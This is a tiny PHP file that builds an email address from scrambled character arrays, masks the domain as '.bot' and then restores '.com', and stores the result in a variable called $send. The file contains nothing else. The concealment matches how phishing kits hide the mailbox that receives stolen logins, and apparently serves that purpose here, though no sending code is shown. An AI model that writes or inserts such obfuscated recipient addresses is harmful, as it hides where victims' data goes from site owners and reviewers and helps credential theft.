<?php
    $mm = array('3','3','1','7'); $ee = $mm[2] . $mm[0] . $mm[1] . $mm[3];  $ff = array('a','x','h','n');  $ee .=  $ff[1] . $ff[2] . $ff[0] . $ff[3];   $gg = array('a','i','l','g','m');
	$tt = $ee; $yrp ='co'; $tt .= '@';  $tt .= $gg[3] . $gg[4] . $gg[0] . $gg[1] . $gg[2] . '.bot';
	$send = str_replace('bot','com', $tt);

?>